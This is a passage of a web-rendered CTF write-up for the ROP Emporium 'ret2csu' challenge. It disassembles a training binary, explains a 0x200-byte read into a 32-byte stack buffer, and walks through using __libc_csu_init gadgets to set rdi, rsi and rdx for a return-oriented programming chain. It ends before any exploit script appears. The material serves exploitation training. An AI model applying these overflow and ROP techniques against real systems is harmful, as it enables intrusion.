operator\",children:\">\"}),`:\tnop\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009d1\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"151\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`:\tleave  \n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009d2\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"152\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`:\tret    \n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`End of assembler dump.\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`(gdb) \n`})]})}),(0,e.jsxs)(a.p,{children:[\"From the above disassembled code, we are reading more than the allocated buffer from the standard input, therefore leading to stack buffer overflow and corrupting the adjacent memory region. The program allocates a stack of fixed size 32bytes. we are reading \",(0,e.jsx)(a.strong,{children:\"0x200\"}),\" from the standard input file descriptor, which is more than the buffer size. The c equivalent of the above vulnerability is,\"]}),(0,e.jsx)(a.pre,{className:\"language-c\",children:(0,e.jsx)(a.code,{className:\"code-highlight language-c\",children:(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token function\",children:\"read\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"rbp\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x200\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" #reading \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x200\"}),\" from the \",(0,e.jsx)(a.span,{className:\"token constant\",children:\"stdin\"}),`\n`]})})}),(0,e.jsx)(a.p,{children:\"For exploitation purpose, is to control the return address of the pwnme function and redirect the execution to our desired address. In order to control the return address we need to fill the buffer with enough data and overflow the saved base pointer.\"}),(0,e.jsx)(a.div,{children:(0,e.jsx)(l,{alt:\"ret control\",src:\"/static/images/ropemporium/stack.png\",width:\"209\",height:\"256\"})}),(0,e.jsxs)(a.p,{children:[\"From the stack image layout above, we need 32 bytes to fill the buffer, 8 bytes to overwrite the saved base pointer and 8 bytes to control return address. Because the \",(0,e.jsx)(a.strong,{children:\"NX\"}),\" execution is enabled on the binary, we can`t use the shellcode techniques, therefore we use other methods such a ropping.\"]}),(0,e.jsxs)(a.h2,{id:\"libc_csu_init-disassembly\",children:[(0,e.jsx)(a.a,{href:\"#libc_csu_init-disassembly\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(a.span,{className:\"icon icon-link\"})}),(0,e.jsx)(a.strong,{children:\"libc_csu_init\"}),\" Disassembly\"]}),(0,e.jsxs)(a.p,{children:[\"Below is the disassembled code for \",(0,e.jsx)(a.strong,{children:\"__libc_csu_init\"}),\" section for the ret2csu binary using objdump tool.objdump is a linux command line tool used for disassembling binaries.\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token number\",children:\"0000000000400640\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`:\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400640\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"57\"}),\"                \tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400642\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"56\"}),\"                \tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400644\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"49\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"89\"}),\" d7             \tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400647\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"55\"}),\"                \tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400649\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"54\"}),\"                \tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40064b:\t4c \",(0,e.jsx)(a.span,{className:\"token number\",children:\"8d\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"25\"}),\" 9e \",(0,e.jsx)(a.span,{className:\"token number\",children:\"07\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"20\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20079e\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # 600df0 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__frame_dummy_init_array_entry\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400652\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"55\"}),\"                   \tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400653\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"8d\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"2d\"}),\" 9e \",(0,e.jsx)(a.span,{className:\"token number\",children:\"07\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"20\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20079e\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # 600df8 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__do_\",(0,e.jsx)(a.span,{className:\"token keyword\",children:\"global_dtors_aux_fini_array_entry>\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40065a:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"53\"}),\"                   \tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40065b:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"89\"}),\" fd             \tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13d\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edi\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40065e:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"49\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"89\"}),\" f6             \tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsi\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400661\"}),\":\t4c \",(0,e.jsx)(a.span,{className:\"token number\",children:\"29\"}),\" e5             \tsub    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400664\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"83\"}),\" ec \",(0,e.jsx)(a.span,{className:\"token number\",children:\"08\"}),\"          \tsub    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsp\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x8\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400668\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" c1 fd \",(0,e.jsx)(a.span,{className:\"token number\",children:\"03\"}),\"          \tsar    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x3\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40066c:\te8 5f fe ff ff       \tcall   4004d0 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400671\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"85\"}),\" ed             \ttest   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400674\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"74\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"20\"}),\"                \tje     \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400696\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x56\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400676\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"31\"}),\" db                \txor    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"ebx\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"ebx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400678\"}),\":\t0f 1f \",(0,e.jsx)(a.span,{className:\"token number\",children:\"84\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \tnop    DWORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40067f:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),` \n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400680\"}),\":\t4c \",(0,e.jsx)(a.span,{className:\"token number\",children:\"89\"}),\" fa             \tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdx\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400683\"}),\":\t4c \",(0,e.jsx)(a.span,{className:\"token number\",children:\"89\"}),\" f6             \tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400686\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"44\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"89\"}),\" ef             \tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13d\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400689\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" ff \",(0,e.jsx)(a.span,{className:\"token number\",children:\"14\"}),\" dc          \tcall   QWORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"40068d\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"83\"}),\" c3 \",(0,e.jsx)(a.span,{className:\"token number\",children:\"01\"}),\"          \tadd    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x1\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400691\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"39\"}),\" dd             \tcmp    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400694\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"75\"}),\" ea                \tjne    \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400680\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_init\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x40\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"400696\"}),\":\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"83\"}),\" c4 \",(0,e.jsx)(a.span,{className:\"token number\",children:\"08\"}),\"          \tadd    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsp\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x8\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069a:\t5b                   \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069b:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"5d\"}),\"                   \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069c:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" 5c                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069e:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"5d\"}),\"                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006a0:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" 5e                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006a2:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" 5f                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`  4006a4:\tc3                   \tret    \n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006a5:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"90\"}),`                   \tnop\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006a6:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"66\"}),\" 2e 0f 1f \",(0,e.jsx)(a.span,{className:\"token number\",children:\"84\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \t\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"cs\"}),\" nop WORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006ad:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"00\"}),` \n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"00000000004006b0 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"__libc_csu_fini\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`:\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`  4006b0:\tf3 c3                \trepz ret z\n`})]})}),(0,e.jsxs)(a.p,{children:[\"The \",(0,e.jsx)(a.strong,{children:\"__libc_csu_init\"}),\" section contains a sequence of pop, ret instructions which makes it a good attack vector for our rop chain. The gadgets present in this section enables us to control \",(0,e.jsx)(a.strong,{children:\"RBX, RBP, R12, R13, R14, and R15\"}),\" registers. From the ret-to-csu referenced paper this makes it a perfect candidate for our first stage and second stage rop chain.\"]}),(0,e.jsx)(a.p,{children:\"The first stage gadget is shown in disassembled code below. This enables us to control the registers with the values we want, which makes our second stage gadget more controllable.\"}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069a:\t5b                   \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069b:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"5d\"}),\"                   \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069c:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" 5c                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  40069e:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" \",(0,e.jsx)(a.span,{className:\"token number\",children:\"5d\"}),\"                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),` \n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006a0:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" 5e                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  4006a2:\t\",(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),\" 5f                \tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`  4006a4:\tc3                   \tret    \n`})]})}),(0,e.jsxs)(a.p,{children:[\"For the second stage, we need to look for the gadgets that will enable us to control the \",(0,e.jsx)(a.strong,{children:\"RDI, RSI and RDX\"}),\" registers in that order. This is because of x86_64 calling convention, the first three arguments to a function are passed in \",(0,e.jsx)(a.strong,{children:\"RDI, RSI and RDX\"}),\" registers respectively. From the disassembly of \",(0,e.jsx)(a.strong,{children:\"__libc_csu_init\"}),\" we can get our second gadget to build our rop chain.\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"mov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdx\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"mov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"mov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13d\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"call   QWORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r12\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbx\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]})]})}),(0,e.jsxs)(a.p,{children:[\"From the above code, we are now able to control the \",(0,e.jsx)(a.strong,{children:\"rdx, rsi and edi\"}),\" registers.The call in the second stage gadgets, calculates the destination address of our code.\"]}),(0,e.jsxs)(a.p,{children:[\"Because we have all the gadgets we need to build our rop chain. From the authors website, the challenge is very similar to \",(0,e.jsx)(a.strong,{children:\"ret2win\"}),\" challenge.\"]}),(0,e.jsx)(a.blockquote,{children:(0,e.jsx)(a.p,{children:'This challenge is very similar to \"callme\", with the exception of the useful gadgets. Simply call the ret2win() function in the accompanying library with same arguments that you used to beat the \"callme\" challenge (ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d) for the ARM & MIPS binaries, ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) for the x86_64 binary.'})}),(0,e.jsx)(a.p,{children:\"From the description, we want to pass three arguments to ret2win function. The arguments will be passed to rdi, rsi and rdx respectively. Because we don`t control the these registers directly, we need to set these arguments in the first rop chain that will enable us to control the rdi, rsi and rdx in the second gadget.\"}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r13\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\"  #first args   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xdeadbeefdeadbeef\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsi\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r14\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\"  #second args  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xcafebabecafebabe\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdx\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"r15\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),\"  #third args   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xd00df00dd00df00d\"}),`\n`]})]})}),(0,e.jsx)(a.p,{children:\"From the code snip above, we are now able to control the values of ropchain by setting the registers values as shown in the code above. For debugging our exploit we will use python3 and gdb. Debugging our exploit ensures that there is no unexpected behavior in the code to avoid crashing of the 